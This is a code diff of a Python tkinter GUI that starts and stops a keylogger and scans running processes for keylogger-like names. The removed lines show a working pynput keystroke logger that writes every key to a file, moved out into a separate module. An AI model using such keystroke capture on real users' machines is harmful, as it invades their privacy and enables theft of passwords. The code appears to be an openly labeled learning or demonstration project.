@@ -1,60 +1,8 @@
 import tkinter as tk
 from tkinter import ttk, scrolledtext
 import threading
-import psutil
-from pynput import keyboard
-
-# Global variables
-keylogger_active = False
-listener = None
-log_file = "keylog.txt"
-
-# Keylogger function
-def on_press(key):
-    try:
-        with open(log_file, "a") as f:
-            f.write(f"{key.char}\n")
-    except AttributeError:
-        with open(log_file, "a") as f:
-            f.write(f"{key}\n")
-
-def start_keylogger():
-    global keylogger_active, listener
-    if not keylogger_active:
-        keylogger_active = True
-        listener = keyboard.Listener(on_press=on_press)
-        listener.start()
-        status_label.config(text="Status: Running", foreground="green")
-
-def stop_keylogger():
-    global keylogger_active, listener
-    if keylogger_active:
-        keylogger_active = False
-        if listener:
-            listener.stop()
-        status_label.config(text="Status: Stopped", foreground="red")
-
-# Function to scan for keyloggers
-def scan_for_keyloggers():
-    keyword_list = ["keylogger", "pynput", "hook", "keyboard"]
-    detected_processes = []
-
-    for process in psutil.process_iter(attrs=['pid', 'name']):
-        try:
-            process_name = process.info['name'].lower()
-            if any(keyword in process_name for keyword in keyword_list):
-                detected_processes.append(f"PID: {process.info['pid']} | Name: {process_name}")
-        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
-            continue  # Ignore processes we can't access
-
-    # Update GUI log
-    log_text.config(state=tk.NORMAL)  # Allow editing
-    log_text.delete(1.0, tk.END)
-    if detected_processes:
-        log_text.insert(tk.END, "\n".join(detected_processes))
-    else:
-        log_text.insert(tk.END, "No keyloggers detected.")
-    log_text.config(state=tk.DISABLED)  # Prevent manual edits
+from keylogger import start_keylogger, stop_keylogger
+from detector import scan_for_keyloggers
 
 # GUI Setup
 root = tk.Tk()
@@ -76,13 +24,34 @@ status_label = ttk.Label(frame, text="Status: Stopped", foreground="red")
 status_label.pack(pady=5)
 
 # Buttons
-start_button = ttk.Button(frame, text="Start Keylogger", command=lambda: threading.Thread(target=start_keylogger, daemon=True).start())
+def start_keylogger_wrapper():
+    result = start_keylogger()
+    status_label.config(text="Status: Running", foreground="green")
+    log_text.config(state=tk.NORMAL)
+    log_text.insert(tk.END, f"{result}\n")
+    log_text.config(state=tk.DISABLED)
+
+start_button = ttk.Button(frame, text="Start Keylogger", command=lambda: threading.Thread(target=start_keylogger_wrapper, daemon=True).start())
 start_button.pack(pady=5, fill=tk.X)
 
-stop_button = ttk.Button(frame, text="Stop Keylogger", command=stop_keylogger)
+def stop_keylogger_wrapper():
+    result = stop_keylogger()
+    status_label.config(text="Status: Stopped", foreground="red")
+    log_text.config(state=tk.NORMAL)
+    log_text.insert(tk.END, f"{result}\n")
+    log_text.config(state=tk.DISABLED)
+
+stop_button = ttk.Button(frame, text="Stop Keylogger", command=stop_keylogger_wrapper)
 stop_button.pack(pady=5, fill=tk.X)
 
-scan_button = ttk.Button(frame, text="Scan for Keyloggers", command=scan_for_keyloggers)
+def scan_for_keyloggers_wrapper():
+    result = scan_for_keyloggers()
+    log_text.config(state=tk.NORMAL)
+    log_text.delete(1.0, tk.END)
+    log_text.insert(tk.END, result)
+    log_text.config(state=tk.DISABLED)
+
+scan_button = ttk.Button(frame, text="Scan for Possible Malicous software", command=scan_for_keyloggers_wrapper)
 scan_button.pack(pady=5, fill=tk.X)
 
 # Log Output
